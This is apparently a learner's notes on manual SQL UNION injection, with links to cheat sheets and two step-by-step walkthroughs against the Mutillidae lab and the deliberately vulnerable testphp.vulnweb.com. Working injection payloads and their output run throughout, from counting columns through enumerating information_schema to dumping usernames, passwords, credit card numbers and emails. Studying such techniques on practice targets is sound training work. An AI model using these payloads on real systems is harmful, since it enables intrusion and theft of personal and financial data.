https://www.computersecuritystudent.com/SECURITY_TOOLS/MUTILLIDAE/MUTILLIDAE_2511/lesson8/index.html
http://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet
https://www.netsparker.com/blog/web-security/sql-injection-cheat-sheet/
https://coderseye.com/learn-sqlmap-and-tutorial
https://www.hackingarticles.in/exploiting-sql-injection-nmap-sqlmap/
(and a cool place to very easily test sql queries on a small database: https://www.w3schools.com/SQL/trysql.asp)
https://purpleskypeter.blogspot.com/2018/03/owasp-security-shepherd-project-sql_2.html (manual UNION & GROUP BY injection example)
https://www.youtube.com/watch?v=OgGnihqEhjk
https://www.w3schools.com/sql/sql_union.asp

Manual UNION injection
----------------------
Example 1
==========

On mutillidae, A1 -> SQL injection -> extract data -> user info

We try with ' in the username field and see that it generates an SQL error -> injectable

We then begin to figure out how the database is mapped.

Let's try this in the username field:

        # ' union select null --

We get the error "Error executing query: The used SELECT statements have a different number of columns"  -> says that our number of columns is incorrect.
We then try to add 'null's in our query:

        # ' union select null,null --
        # ' union select null,null,null --

until we don't get this different number of columns error anymore. That brings us to:

        # ' union select null,null,null,null,null --

There we don't get an error anymore, and the ouput it:

        Username=
        Password=
        Signature=

The goal with the following union statement is to map out which fields in the database align with the numbers when the output is displayed:

        # ' union select 1,2,3,4,5 --

here the output gives us very useful information:

        Username=2
        Password=3
        Signature=4

So, we know that Username is the second table field, Password is the third table field, and Signature is the forth table field

The goal with the following union statement is to map out which fields in the database align with these fields when the output is displayed:

        # ' union select ccid,ccnumber,ccv,expiration,null from credit_cards --

Output:

        Username=4444111122223333
        Password=745
        Signature=2012-03-01

        Username=7746536337776330
        Password=722
        Signature=2015-04-01

        Username=8242325748474749
        Password=461
        Signature=2016-03-01

Notice that Username is populated with a credit card number, Password is populated with the CCV, and Signature is populated with the expiration


Example 2
=========
https://www.hackingarticles.in/manual-sql-injection-exploitation-step-step/

We will use http://testphp.vulnweb.com/artists.php as a vulnerable website.

If we click on the first artist's name, we land on http://testphp.vulnweb.com/artists.php?artist=1. We can try if it's vulnerable to injection by doing

        http://testphp.vulnweb.com/artists.php?artist=1'

This gives us a warning, which is good news:

        Warning: mysql_fetch_array() expects parameter 1 to be resource, boolean given in /hj/var/www/artists.php on line 62

Now we're using ORDER BY keyword to sort the records in ascending or descending order for id=1:

		http://testphp.vulnweb.com/artists.php?artist=1 order by 1

Now similarly we will repeat for order 2, 3 and so on one by one.

And we see we reach an error when we try 'order by 4', which means we only have 3 columns

Now let’s penetrate more inside using union base injection to select statement from a different table:

it is showing results for only one table not for others.

		http://testphp.vulnweb.com/artists.php?artist=1 union select 1,2,3

Now we try to pass a wrong input into the database through URL by replacing artist=1 with artist=-1.

		http://testphp.vulnweb.com/artists.php?artist=-1 union select 1,2,3

Now we see:

		Artist: 2
		3

So it's responding to our query. Since we see that it outputs two of our three values in the document (2 & 3), we can replace one of these two values with something else to extract info, for example database():

		http://testphp.vulnweb.com/artists.php?artist=-1 union select 1,database(),3

Now we see:

		Artist: acuart
		3

We got the name of the database (acuart) !

The next query will extract the current username as well as a version of the database system:

		http://testphp.vulnweb.com/artists.php?artist=-1 union select 1,version(),current_user()

And we get:

		Artist: 5.1.73-0ubuntu0.10.04.1
		acuart@localhost

So we now know the version of the system and the current user.

Through the next query, we will try to fetch table name inside the database:

		http://testphp.vulnweb.com/artists.php?artist=-1 union select 1,table_name,3 from information_schema.tables where table_schema=database() limit 0,1

		(about information_schema: https://dev.mysql.com/doc/refman/5.7/en/information-schema-introduction.html)

And we get:

		artist: artists

==> Table = artists

Now we get the name of the second table:

		http://testphp.vulnweb.com/artists.php?artist=-1 union select 1,table_name,3 from information_schema.tables where table_schema=database() limit 1,1

We get:

			artist: carts

		http://testphp.vulnweb.com/artists.php?artist=-1 union select 1,table_name,3 from information_schema.tables where table_schema=database() limit 2,1

			artist: categ

		http://testphp.vulnweb.com/artists.php?artist=-1 union select 1,table_name,3 from information_schema.tables where table_schema=database() limit 3,1

			artist: featured
		http://testphp.vulnweb.com/artists.php?artist=-1 union select 1,table_name,3 from information_schema.tables where table_schema=database() limit 4,1

			artist: guestbook
		http://testphp.vulnweb.com/artists.php?artist=-1 union select 1,table_name,3 from information_schema.tables where table_schema=database() limit 5,1

			artist: pictures
		http://testphp.vulnweb.com/artists.php?artist=-1 union select 1,table_name,3 from information_schema.tables where table_schema=database() limit 6,1

			artist: products
		http://testphp.vulnweb.com/artists.php?artist=-1 union select 1,table_name,3 from information_schema.tables where table_schema=database() limit 7,1

			artist: users
		http://testphp.vulnweb.com/artists.php?artist=-1 union select 1,table_name,3 from information_schema.tables where table_schema=database() limit 8,1

		==> gives us nothing. Since we didn’t get anything when the limit is set 8,1 it means there probably are 8 tables only inside the database.


The concat function is used for concatenation of two or more string into a single string:
	http://testphp.vulnweb.com/artists.php?artist=-1 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()

Gives us:

	artist: artists,carts,categ,featured,guestbook,pictures,products,users

You can see through concat function we have successfully retrieved all table name inside the database.
		Table 1: artist
		Table 2: Carts
		Table 3: Categ
		Table 4: Featured
		Table 5: Guestbook
		Table 6: Pictures
		Table 7: Product
		Table 8: users

Maybe we can get some important data from the users table, so let’s penetrate more inside.  Again Use the concat function for table users for retrieving its entire column names:
	http://testphp.vulnweb.com/artists.php?artist=-1 union select 1,group_concat(column_name),3 from information_schema.columns where table_name=%27users%27

We get:

	artist: uname,pass,cc,address,email,name,phone,cart

Awesome!!  We successfully retrieve all eight column names from inside the table users.

Use the concat function for selecting uname from table users by executing the following query through URL:

	http://testphp.vulnweb.com/artists.php?artist=-1 union select 1,group_concat(uname),3 from users

We get the user:

	artist: test

Use the concat function for selecting pass from table users by executing the following query through URL:

We get the pass:

	artist: test

Use the concat function for selecting cc (credit card) from table users by executing the following query through URL:

	http://testphp.vulnweb.com/artists.php?artist=-1 union select 1,group_concat(cc),3 from users

We get:

	artist: 1234567890

We can do the same for email, cart id etc.

	http://testphp.vulnweb.com/artists.php?artist=-1 union select 1,group_concat(email),3 from users

	=> artist: happybhaagjaegi@gmail.com
